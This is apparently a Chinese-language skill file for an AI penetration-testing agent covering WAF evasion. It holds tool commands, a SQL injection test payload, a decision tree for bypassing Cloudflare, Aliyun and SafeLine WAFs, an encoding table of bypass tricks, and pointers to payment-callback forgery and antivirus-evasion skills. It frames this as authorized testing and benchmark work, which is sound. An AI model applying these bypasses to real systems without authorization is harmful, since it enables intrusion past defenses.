---
name: 隐鳞
description: >-
 大爱仙尊·Skill: 对抗规避（Evasion）
---

# 对抗规避（Evasion）

## 适用场景

授权目标遭遇以下情况时使用本 Skill：
- WAF / CDN 拦截 payload（403/406/444/503）
- 扫描器被封 IP / rate-limit（**换出口**先读 `狼烟.md`，不要 SSH 用户主机）
- 怀疑目标是蜜罐/沙箱
- 需要伪装 UA / 请求头绕过指纹检测
- Tsecbench 对抗规避题型

## 工具

```
tools/evasion-kit/evasion.py
```

## 快速命令

```bash
# 生成随机 UA 池
python3 tools/evasion-kit/evasion.py ua-pool --count 5

# payload 编码变体（cloudflare/aliyun/safedog/safeline/generic）
python3 tools/evasion-kit/evasion.py encode \
 --payload "<payload>" --waf cloudflare

# 在授权目标逐一测试哪些变体能过 WAF
python3 tools/evasion-kit/evasion.py matrix \
 --url https://TARGET/search \
 --payload "' OR 1=1--" \
 --param q --waf cloudflare \
 --case CASE --delay-ms 800

# 蜜罐/沙箱检测
python3 tools/evasion-kit/evasion.py sandbox-detect \
 --url https://TARGET --case CASE
```

## 决策树

```
WAF 拦截
 │
 ├─ cloudflare (cf-ray 头)？ → --waf cloudflare + chunked/dots 变体
 ├─ 阿里云盾 (ali-swift 头)？ → --waf aliyun，unicode %u0027
 ├─ SafeLine？ → --waf safeline，multipart Content-Type
 ├─ 通用签名拦截？ → double-url-encode / newline-inject
 └─ 全部被拦？ → 换慢速时序 --delay-ms 3000 + UA 轮换

蜜罐怀疑（sandbox-detect）
 ├─ verdict: suspicious → 降低侦察烈度，收窄发包频率
 └─ verdict: clean → 正常推进
```

## 编码矩阵说明

| 变体标签 | 原理 | 典型绕过 WAF |
|---------|------|-------------|
| url-encode | `%27` | 基础 |
| double-url-encode | `%2527` | 二次解码 WAF |
| url-encode-upper | `%27` 大写 | 大小写不敏感签名 |
| fullwidth | `＇` | 语义匹配型 WAF |
| comment-insert | `se/**/lect` | MySQL 注入 |
| newline-inject | `%0a` 替换空格 | 正则换行盲点 |
| case-mix | `SeLeCt` | 大小写不敏感签名 |
| html-entity/decimal/hex | `&#60;` | XSS WAF |
| cf-chunk-header | chunked 分块 | Cloudflare |
| aliyun-unicode | `%u0027` | 阿里云盾 |

## 与其他 Skill 联动

- bypass 命中 → 用变体进 `sqlmap-tamper-kit` 或 `payment-callback-forgery`
- sandbox 检测 → 若 suspicious 先整理 triage，降优先级
- WAF 类型先用 `waf-detector` Skill 识别，再来本 Skill 选变体

## 证据落盘

```
案卷/<案卷>/案卷/evasion/
 bypass_matrix.json
 sandbox_detect.json
```

## 真源

- 手法：`传承/隐鳞·手册.md`
- 工具：`python3 tools/evasion-kit/evasion.py --help`
- 主机免杀 / 特征清理（不是 WAF）→ `传承/隐鳞.md` · `sig_cleanup_scan.py`
